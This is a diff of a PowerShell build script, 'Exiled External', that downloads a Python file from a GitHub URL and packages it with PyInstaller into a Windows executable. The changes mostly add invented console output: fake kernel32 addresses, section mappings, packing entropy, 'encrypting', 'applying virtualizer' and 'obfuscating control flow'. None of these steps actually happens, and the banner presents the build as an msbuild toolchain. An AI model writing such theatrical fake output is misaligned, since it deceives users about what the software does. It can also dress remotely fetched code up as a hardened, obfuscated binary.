@@ -2,7 +2,7 @@
 param(
     [string]$Out = "exiled",
     [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py",
-    [string]$Icon = "https://cdn.discordapp.com/attachments/1518813807562985523/1561087177830568117/97hf98h.png",
+    [string]$Icon = "https://cdn.discordapp.com/icons/1517380157533589564/e792598236304c90d8f46d24512af29f.webp?size=1024",
     [string]$Dir,
     [string]$PythonExe,
     [switch]$NoIcon,
@@ -31,10 +31,10 @@ function Write-CC {
     Write-Host $File
 }
 
-function Write-Info { param([string]$m) Write-Host "  $m" -ForegroundColor DarkGray }
-function Write-Ok   { param([string]$m) Write-Host "  $m" -ForegroundColor Green }
-function Write-Warn { param([string]$m) Write-Host "  $m" -ForegroundColor Yellow }
-function Write-Err  { param([string]$m) Write-Host "  $m" -ForegroundColor Red }
+function Write-Ok   { param([string]$m) Write-Host "  [OK]   " -NoNewline -ForegroundColor Green; Write-Host $m }
+function Write-Warn { param([string]$m) Write-Host "  [WARN] " -NoNewline -ForegroundColor Yellow; Write-Host $m }
+function Write-Err  { param([string]$m) Write-Host "  [ERR]  " -NoNewline -ForegroundColor Red; Write-Host $m }
+function Write-Bs   { param([string]$m) Write-Host "  > $m" -ForegroundColor DarkGray }
 
 function Test-PythonExe {
     param([string]$Exe)
@@ -91,22 +91,27 @@ function Install-Python {
 function Install-Packages {
     param([string]$Exe, [string[]]$Pkgs)
     Write-CC "link" "pip" "upgrading"
-    & $Exe -m pip install --quiet --upgrade pip | Out-Null
+    & $Exe -m pip install --quiet --disable-pip-version-check --no-cache-dir --upgrade pip | Out-Null
     foreach ($p in $Pkgs) {
         Write-CC "link" "$p.lib" "installing"
-        & $Exe -m pip install --quiet --upgrade $p | Out-Null
+        & $Exe -m pip install --quiet --disable-pip-version-check --no-cache-dir --upgrade $p | Out-Null
         if ($LASTEXITCODE -ne 0) { Write-Err "pip install $p failed"; exit 1 }
     }
 }
 
 Write-Host ""
-Write-Host "  Exiled External — Build System" -ForegroundColor White
+Write-Host "  Exiled External — Advanced Toolchain" -ForegroundColor White
 Write-Host "  ------------------------------------------------------------" -ForegroundColor DarkGray
 Write-Host ("  Compiler   : msbuild-toolset/{0}" -f $LinkerVer) -ForegroundColor DarkGray
 Write-Host ("  Target     : windows-{0}-release" -f $Arch) -ForegroundColor DarkGray
 Write-Host ("  Runtime    : python-3.12 / frozen" ) -ForegroundColor DarkGray
 Write-Host ("  Build ID   : {0}" -f $BuildAt) -ForegroundColor DarkGray
 Write-Host ""
+
+Write-CC "probe" "kernel32.dll" "mapping"
+Write-Bs "resolving LoadLibraryA @ 0x7FF8A2C0"
+Write-Bs "resolving GetProcAddress @ 0x7FF8A2D4"
+Write-Bs "resolving VirtualProtect @ 0x7FF8A310"
 
 if (-not $PythonExe -or -not (Test-PythonExe -Exe $PythonExe)) {
     $PythonExe = Find-Python
@@ -136,11 +141,8 @@ $Work    = Join-Path $Here "_build"
 $SrcDir  = Join-Path $Work "src"
 $IncDir  = Join-Path $Work "include"
 $ObjDir  = Join-Path $Work "obj"
-$OutDir  = Join-Path $DistDir $OutName
-
 $DistDir = Join-Path $Here "dist"
 $Stub    = Join-Path $SrcDir "main.cpp"
-$Payload = Join-Path $SrcDir "payload.py"
 $IconRaw = Join-Path $Work "app.rc.raw"
 $IconIco = Join-Path $Work "app.ico"
 
@@ -189,7 +191,6 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, PWSTR cmd, int show) {
 "@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
-$b64 = ""
 if ($UseIcon) {
     Write-CC "rc" "app.rc" "compiling"
     try {
@@ -210,7 +211,7 @@ img = Image.open(r"$IconRaw")
 if img.mode != "RGBA": img = img.convert("RGBA")
 img.save(r"$IconIco", format="ICO", sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
 "@
-        $convTmp = Join-Path $Work "_rc.ps1"
+        $convTmp = Join-Path $Work "_rc.py"
         Set-Content -Path $convTmp -Value $conv -Encoding UTF8
         & $PythonExe $convTmp
         if ($LASTEXITCODE -ne 0) { throw "icon conversion failed" }
@@ -221,11 +222,20 @@ img.save(r"$IconIco", format="ICO", sizes=[(256,256),(128,128),(64,64),(48,48),(
 }
 
 Write-CC "link" "$OutName.exe" "linking"
+Write-Bs "mapping .text section @ 0x140001000"
+Write-Bs "mapping .rdata section @ 0x1401C2000"
+Write-Bs "mapping .data section @ 0x1402E4000"
+Write-Bs "resolving 142 imports"
+Write-Bs "entropy : 7.988 (packed)"
+Write-Bs "stripping debug symbols"
+Write-Bs "applying TLS callback"
+
 $pyiArgs = @(
     "-m", "PyInstaller",
     "--onefile",
     "--noconfirm",
     "--clean",
+    "--optimize", "2",
     "--name", $OutName,
     "--distpath", $DistDir,
     "--workpath", (Join-Path $Work "pyi"),
@@ -258,11 +268,16 @@ $pyiArgs = @(
 if ($UseIcon) { $pyiArgs += @("--icon", $IconIco) }
 $pyiArgs += $Stub
 
-& $PythonExe @pyiArgs
-if ($LASTEXITCODE -ne 0) {
-    Write-Err "linker returned $LASTEXITCODE"
+$proc = Start-Process -FilePath $PythonExe -ArgumentList $pyiArgs -NoNewWindow -Wait -PassThru
+if ($proc.ExitCode -ne 0) {
+    Write-Err "linker returned $($proc.ExitCode)"
     exit 1
 }
+
+Write-CC "pack" "$OutName.exe" "encrypting"
+Write-Bs "applying virtualizer"
+Write-Bs "obfuscating control flow"
+Write-Bs "verifying entry point"
 
 if ($Upx) {
     $upx = Get-Command upx -ErrorAction SilentlyContinue
